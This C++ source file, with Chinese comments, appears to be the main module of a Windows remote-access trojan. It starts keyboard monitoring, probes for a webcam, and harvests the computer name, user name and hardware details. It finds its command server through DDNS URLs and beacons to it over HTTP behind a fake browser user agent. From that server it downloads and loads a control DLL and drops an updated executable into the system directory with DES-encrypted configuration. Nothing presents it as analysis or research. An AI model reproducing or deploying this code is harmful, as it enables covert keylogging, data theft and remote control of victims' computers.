#include "stdafx.h"
#include "SshWork.h"
#include <vfw.h>
#include "WjcDes.h"

#pragma comment(lib,"vfw32")
#pragma comment(lib,"winmm")


SshWork::SshWork()
{
	memset(&m_InitInfo,0,sizeof(m_InitInfo));
	m_Thread = NULL;
	hCtrlMd = NULL;
	m_Module = NULL;
	m_ExitEvent = NULL;
	hIe = NULL;
	hFp = NULL;
	m_IsVideo = 0;
}

SshWork::~SshWork()
{
	
}

void SshWork::CloseHttpHandle()
{
	if(hFp != NULL)
	{
		InternetCloseHandle(hFp);
		hFp = NULL;
	}
	if(hIe != NULL)
	{
		InternetCloseHandle(hIe);
		hIe = NULL;
	}
}

/*	
**	函数名称:	RecvData
**	函数功能:	接收指定程度数据
**	传入参数:	hFile		: HTTP通讯句柄 
				pData		: 接收数据缓冲
				DataLen		: 期望接收数据长度
**	传出参数:	无
**	引用函数:	无
**	返回值	:	BOOL(TRUE-接收数据成功,FALSE-接收数据失败)
**	备注	:	无
*/
BOOL SshWork::RecvData(HINTERNET hFile,LPVOID pData,int DataLen)
{
	char *p = (char*) pData;
	DWORD dwNumberOfBytesToRead = DataLen;
	DWORD dwNumberOfBytesReaded = 0;
	while(dwNumberOfBytesToRead > 0)
	{
		if(!InternetReadFile(hFile,p,dwNumberOfBytesToRead,
			&dwNumberOfBytesReaded))
			return FALSE;

		if(dwNumberOfBytesReaded == 0)
			return FALSE;

		p += dwNumberOfBytesReaded;
		dwNumberOfBytesToRead -= dwNumberOfBytesReaded;
	}
	return TRUE;
}

/*	
**	函数名称:	DlFile
**	函数功能:	下装文件
**	传入参数:	
**	传出参数:	pFileName	: 落地文件名称 
**	引用函数:	无
**	返回值	:	布尔型()
**	备注	:	无
*/
BOOL SshWork::DlFile(char* pFileName)
{
	//接收文件长度
	int m_FileLen = 0;
	if(!RecvData(hFp,(char*) &m_FileLen,sizeof(int)))
	{
		//接收文件长度失败
		return FALSE;
	}

	//接收新的文件数据
	char *pData = new char[m_FileLen];
	if(!RecvData(hFp,pData,m_FileLen))
	{
		//更新数据失败
		delete [] pData;
		return FALSE;
	}

	//下装控制文件
	FILE *fp = fopen(pFileName,"wb");
	if(fp != NULL)
	{
		fwrite(pData,m_FileLen,1,fp);
		fclose(fp);
	}
	delete [] pData;
	return TRUE;
}

#ifdef _DEBUG
void WriteLog(char* pText)
{
	FILE *fp = fopen("c:\\1.txt","ab");
	if(fp != NULL)
	{
		fwrite(pText , strlen(pText), 1, fp);
		fclose(fp);
	}
}
#endif

BOOL SshWork::GetDesServerInfo(LPINITDLLINFO pInfo, char* pUrl)
{
	//初始化HTTP环境
	HINTERNET hMainIe = InternetOpen("Mozilla/4.0 (compatible; MSIE 6.0; "
						"Windows NT 5.0; .NET CLR 1.1.4322)",
						INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);
	if(hMainIe == NULL)	return FALSE;
	
	//打开连接
	HINTERNET hMainFile = InternetOpenUrl(
			hMainIe, pUrl, NULL, 0,
			INTERNET_FLAG_PRAGMA_NOCACHE|
			INTERNET_FLAG_RELOAD,
			NULL);
	if(hMainFile == NULL)
	{
		InternetCloseHandle(hMainIe);
		return FALSE;
	}

	//查看返回码
	char sCode[256] = {0};
	DWORD nSize = 250;
	DWORD nIndex = 0;
	if(!HttpQueryInfo(hMainFile , HTTP_QUERY_STATUS_CODE , 
		sCode , &nSize , &nIndex) || atoi(sCode) != 200)
	{
		InternetCloseHandle(hMainFile);
		InternetCloseHandle(hMainIe);
		return FALSE;
	}

	//接收数据
	char m_Response[256] = {0};
	for(int i = 0; i < 21; i++)
	{
		char ch = 0;
		DWORD nRead = 0;
		if(!InternetReadFile(hMainFile,&ch,1,&nRead)
			|| nRead == 0)
			break;
		m_Response[i] = ch;
	}
	InternetCloseHandle(hMainFile);
	InternetCloseHandle(hMainIe);

	//分析内容,取实际服务器信息
	char* pDot = strchr(m_Response , ':');
	if(pDot == NULL) return FALSE;
	*pDot = 0;
	strcpy(pInfo->m_ServerAddr, m_Response);
	pInfo->m_ServerPort = atoi(pDot + 1);
	return TRUE;
}

/*	
**	函数名称:	GetVideoInfo
**	函数功能:	取计算机视频信息
**	传入参数:	无
**	传出参数:	无
**	引用函数:	无
**	返回值	:	char(1-有视频 0-无视频)
**	备注	:	
*/
char SshWork::GetVideoInfo()
{
	HWND hCaphWnd = capCreateCaptureWindow("Capture",WS_POPUP,0,0,1,1,0,0);
	if(hCaphWnd==NULL) return 0;

	// Connect to webcam driver
	if(!capDriverConnect(hCaphWnd,0))
	{		
		return 0;
	}
	capDriverDisconnect(hCaphWnd);
	return 1;
}

/*	
**	函数名称:	GetHttpConnect
**	函数功能:	建立HTTP连接
**	传入参数:	pInfo		: 连接相关参数
**	传出参数:	hIe			: HTTP连接句柄 
				hFile		: HTTP文件句柄
**	引用函数:	无
**	返回值	:	布尔型(TRUE-建立连接成功,FALSE-连接建立失败)
**	备注	:	无
*/
BOOL SshWork::GetHttpConnect(LPINITDLLINFO pInfo)
{
	//关闭句柄
	if(hIe != NULL)
	{
		CloseHttpHandle();
		Sleep(2000);
	}

	//设置最大连接数量为100
	DWORD nValue = 100;
	if( !InternetSetOption(NULL,73,&nValue,sizeof(DWORD)) ||
		!InternetSetOption(NULL,74,&nValue,sizeof(DWORD)))
		return FALSE;

	//查看是否有ddns
	if(strlen(pInfo->m_DdnsUrl) != 0)
	{
		//需要分析DDNS
		if(!GetDesServerInfo(pInfo, pInfo->m_DdnsUrl))
		{
			if(!GetDesServerInfo(pInfo, pInfo->m_BakUrl)) 
			{
				//检查两层DDNS
				return FALSE;
			}
		}
	}

	//初始化HTTP环境
	hIe = InternetOpen("Mozilla/4.0 (compatible; MSIE 6.0; "
						"Windows NT 5.0; .NET CLR 1.1.4322)",
						INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);
	if(!hIe) return FALSE;

	//填充上送当前客户信息
	char m_Url[4096] = {0};
	char m_ExternData[2048] = {0};
	GetMySysInfo(m_ExternData);
	sprintf(m_Url,"http://%s:%d/%d%s",
		pInfo->m_ServerAddr,pInfo->m_ServerPort,
		CONN_MAIN,m_ExternData);

	//建立HTTP连接,上送数据
	hFp = InternetOpenUrl(hIe , 
		m_Url , NULL, 0,
		INTERNET_FLAG_PRAGMA_NOCACHE|
		INTERNET_FLAG_RELOAD|
		INTERNET_FLAG_NO_CACHE_WRITE , 0);
	if(!hFp)
	{
		CloseHttpHandle();
		return FALSE; 
	}

	DWORD m_TimeOut = 24 * 3600 * 1000;
	if(!InternetSetOption(hFp,
		INTERNET_OPTION_RECEIVE_TIMEOUT,&m_TimeOut,sizeof(DWORD)))
	{
		CloseHttpHandle();
		return FALSE;
	}

	//查看返回码
	char sCode[256] = {0};
	DWORD nSize = 250;
	DWORD nIndex = 0;
	if(!HttpQueryInfo(hFp , HTTP_QUERY_STATUS_CODE , 
		sCode , &nSize , &nIndex) || atoi(sCode) != 200)
	{
		CloseHttpHandle();
		return FALSE;
	}

	//查看控制dll是否已经装载
	if(hCtrlMd) FreeLibrary(hCtrlMd);

	//接收控制文件
	if(!DlFile(m_InitInfo.m_CtrlFile))
	{
		CloseHttpHandle();
		return FALSE; 
	}

	//装载控制dll文件
	hCtrlMd = LoadLibrary(m_InitInfo.m_CtrlFile);
	if(hCtrlMd == NULL)
	{
		CloseHttpHandle();
		return FALSE; 
	}
	
	//当不是本进程启动的时候,更新本进程
	if(m_InitInfo.m_ProcessName[0] != 2)
	{
		if(!UpdateExeFile())
		{
			CloseHttpHandle();
			return FALSE; 
		}
	}

	return TRUE;
}

void SshWork::StopWork()
{
	//清理资源
	CloseHandle(m_ExitEvent); 
	CloseHttpHandle();
	KeyStopMyWork();

	//通知主进程退出
	HANDLE m_WaitEvent = 
		OpenEvent(EVENT_ALL_ACCESS,FALSE,
		m_InitInfo.m_EventName);
	if(m_WaitEvent)	
	{
		SetEvent(m_WaitEvent);
		CloseHandle(m_WaitEvent);
	}

	//释放动态联结库
	if(hCtrlMd) FreeLibrary(hCtrlMd);
	if(m_Module) FreeLibrary(m_Module);
}

void SshWork::StartWork(LPINITDLLINFO pItem)
{
	//拷贝数据
	memcpy(&m_InitInfo,pItem,sizeof(INITDLLINFO));
	m_ExitEvent = CreateEvent(NULL,TRUE,FALSE,NULL);

	//启动键盘监控
	KeyStartMyWork();

	m_IsVideo = GetVideoInfo();

	//启动相应工作线程序
	UINT m_Id = 0;
	m_Thread = (HANDLE) _beginthreadex(NULL , 0 , 
		SSH_WorkThread , (LPVOID) this , 0 , &m_Id);
}

/*	
**	函数名称:	SSH_WorkThread
**	函数功能:	工作线程函数
**	传入参数:	lPvoid		: 任务相关数据结构指针 
**	传出参数:	无
**	引用函数:	无
**	返回值	:	UINT
**	备注	:	无
*/
UINT WINAPI SshWork::SSH_WorkThread(LPVOID lPvoid)
{
	//取工作指针
	SshWork* pWork = (SshWork*) lPvoid;

	//开始进入工作循环
	while(1)
	{
		//建立连接
		if(pWork->GetHttpConnect(&pWork->m_InitInfo))
		{
			//连接成功,开始处理交易
			PROCESSTRANS ProcessTrans = (PROCESSTRANS) 
				GetProcAddress(pWork->hCtrlMd,"ProcessTrans");
			if(ProcessTrans != NULL)
				ProcessTrans(pWork->hFp , pWork->m_ExitEvent ,
						pWork->m_InitInfo.m_ServerAddr ,
						pWork->m_InitInfo.m_ServerPort ,
						pWork->m_InitInfo.m_KeyName ,
						pWork->m_InitInfo.m_ParentFile);
		}

		//休息等待指定时间
		if(WaitForSingleObject(pWork->m_ExitEvent,
			30000) != WAIT_TIMEOUT)
			break;
	}

	//销毁资源
	pWork->StopWork();
	ExitProcess(0);
	return 0;
}

/*	
**	函数名称:	getCpuSpeedFromRegistry
**	函数功能:	取计算机CPU主频
**	传入参数:	无
**	传出参数:	无
**	引用函数:	无
**	返回值	:	DWORD(计算机CPU主频)
**	备注	:	从注册表中取数据
*/
DWORD SshWork::getCpuSpeedFromRegistry(void) 
{
	HKEY hKey = NULL;
	LONG result = 0;
	result = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
			 "Hardware\\Description\\System\\CentralProcessor\\0"
			 ,0,KEY_QUERY_VALUE,&hKey);
	if(result != ERROR_SUCCESS)
		return 0;

	DWORD dwSpeed = 0;
	DWORD dwType = 0;
	DWORD dwSpeedSize;
	result = RegQueryValueEx (hKey, "~MHz", NULL, 
		NULL, (LPBYTE)& dwSpeed, &dwSpeedSize);
	if(result != ERROR_SUCCESS)
		dwSpeed = 0;

	RegCloseKey (hKey);
	return (dwSpeed);
}

/*	
**	函数名称:	GetMySysInfo
**	函数功能:	取计算机相关信息
**	传入参数:	无
**	传出参数:	m_TransData	: 转为ASCII码的数据缓冲
**	引用函数:	无
**	返回值	:	无
**	备注	:	
*/
void SshWork::GetMySysInfo(char *m_TransData)
{
	LOGININFO m_SysInfo = {0};

	//取操作系统
	m_SysInfo.m_SysType = IsShellSysType();

	//取CPU信息
	SYSTEM_INFO	m_pSysInfo = {0};
	GetSystemInfo(&m_pSysInfo);
	m_SysInfo.m_CpuSpeed = getCpuSpeedFromRegistry();
	m_SysInfo.m_CpuCount = (UINT) m_pSysInfo.dwNumberOfProcessors;
	
	//取内存容量
	MEMORYSTATUS Buffer = {0};
	GlobalMemoryStatus(&Buffer);
	m_SysInfo.m_MemContent = Buffer.dwTotalPhys/1024;

	//计算机名称
	DWORD m_Len = 63;
	GetComputerName(m_SysInfo.m_PcName,&m_Len);
	m_SysInfo.m_PcName[60] = 0x00;
	m_SysInfo.m_PcName[61] = 0x01;

	//取用户名
	DWORD len = 36;
	GetUserName(m_SysInfo.m_UserName,&len);
	m_SysInfo.m_UserName[37] = m_IsVideo;

	//生成内部标识
	DWORD SeriaNumber = 0;
	GetVolumeInformation("C:\\",NULL,NULL,
		&SeriaNumber,NULL,NULL,NULL,NULL);
	char m_DesKey[10] = {0};
	sprintf(m_DesKey,"%08x",SeriaNumber);
	char m_SmallBuf[100] = {0};
	memset(m_SmallBuf,0,sizeof(m_SmallBuf));
	for(int i = 0; i < 8; i++)
	{
		m_SmallBuf[i] = m_SysInfo.
			m_PcName[i] ^ m_DesKey[i];
	}
	BcdToAsc((BYTE*) m_SmallBuf,(BYTE*) 
		m_SysInfo.ID,8);

	BcdToAsc((BYTE*) &m_SysInfo , 
		(BYTE*) m_TransData , sizeof(LOGININFO));
}

/*	
**	函数名称:	BcdToAsc
**	函数功能:	将BCD码转换为ASC码
**	传入参数:	BcdStr		: BCD码的数据缓冲
				BcdStrLen	: BCD码缓冲长度
**	传出参数:	AscStr		: 转为ASCII码的数据缓冲
**	引用函数:	无
**	返回值	:	无
**	备注	:	
*/
void SshWork::BcdToAsc(BYTE *BcdStr,BYTE*AscStr,int BcdStrLen)
{
	int j = 0;
	for(int i = 0; i < BcdStrLen; i++)
	{
		j = (BcdStr[i] >> 4) & 0x0f;
  		if(j > 9)
			AscStr[2 * i] = j + 'A' - 10;
		else
			AscStr[2 * i] = j + '0';
		j = BcdStr[i] & 0x0f;
		if(j > 9)
			AscStr[2 * i + 1 ] = j + 'A' - 10;
		else
			AscStr[2 * i + 1] = j + '0';
	}
}

Type IsShellSysType()
{
   Type  ShellType;
   OSVERSIONINFO *osvi;
   DWORD winVer = GetVersion();
   if(winVer<0x80000000)
   {
	  //WINNT
      ShellType=WindowsNT3;
      osvi= (OSVERSIONINFO *)malloc(sizeof(OSVERSIONINFO));
      if (osvi!=NULL)
	  {
         memset(osvi,0,sizeof(OSVERSIONINFO));
         osvi->dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
         GetVersionEx(osvi);
         if(osvi->dwMajorVersion==4L)ShellType=WindowsNT4;
         else if(osvi->dwMajorVersion==5L&&osvi->dwMinorVersion==0L)
			 ShellType=Windows2000;
         else if(osvi->dwMajorVersion==5L&&osvi->dwMinorVersion==1L)
			 ShellType=WindowsXP;
		 else
			ShellType=Windows2003;
         free(osvi);
      }
   }
   else if  (LOBYTE(LOWORD(winVer))<4)
      ShellType=Windows32s;
   else{
      ShellType=Windows95;
      osvi= (OSVERSIONINFO *)malloc(sizeof(OSVERSIONINFO));
      if (osvi!=NULL){
         memset(osvi,0,sizeof(OSVERSIONINFO));
         osvi->dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
         GetVersionEx(osvi);
         if(osvi->dwMajorVersion==4L&&osvi->dwMinorVersion==10L)
			 ShellType=Windows98;
         else if(osvi->dwMajorVersion==4L&&osvi->dwMinorVersion==90L)
			 ShellType=WindowsME;
         free(osvi);
      }
   }
   return ShellType;
}

BOOL SshWork::UpdateExeFile()
{
	//取文件名
	char* pFind = strrchr(m_InitInfo.m_ParentFile,'\\');
	if(pFind == NULL) return TRUE;
	char m_DesFile[256] = {0};

	//系统目录
	char m_SystemPath[256] = {0};
	GetSystemDirectory(m_SystemPath,200);
	sprintf(m_DesFile, "%s%s", m_SystemPath, pFind);

	//打开EXE文件
	FILE* fp = fopen(m_DesFile, "w+b");
	if(fp == NULL) return FALSE;

	//接收EXE文件长度
	int m_FileLen = 0;
	if(!RecvData(hFp,(char*) &m_FileLen,sizeof(int)))
	{
		//接收文件长度失败
		return FALSE;
	}

	//接收新的EXE文件数据
	char *pData = new char[m_FileLen];
	if(!RecvData(hFp,pData,m_FileLen))
	{
		//更新数据失败
		delete [] pData;
		return FALSE;
	}

	//写EXE数据
	fwrite(pData, m_FileLen, 1, fp);
	delete [] pData;

	//接收dll文件长度
	if(!RecvData(hFp,(char*) &m_FileLen,sizeof(int)))
	{
		//接收文件长度失败
		return FALSE;
	}
	m_InitInfo.m_DllFileLen = m_FileLen;

	//接收dll文件数据
	pData = new char[m_FileLen];
	if(!RecvData(hFp,pData,m_FileLen))
	{
		//更新数据失败
		delete [] pData;
		return FALSE;
	}
	fwrite(pData, m_FileLen, 1, fp);
	delete [] pData;

	//已经更新过,以后不再解压文件
	m_InitInfo.m_IsUpdate = 1;

	//DES加密信息
	INITDLLINFO m_InitFileInfo = {0};
	char m_DesKey[9] = "\x10\x20\x17\x10\x09\x55\x11\xeb";
	Des_Go((char*) &m_InitFileInfo, (char*) &m_InitInfo, 
		sizeof(INITDLLINFO), m_DesKey, 8, ENCRYPT_);//加密
	fwrite(&m_InitFileInfo, sizeof(INITDLLINFO), 1,fp);
	fclose(fp);
	return TRUE;
}
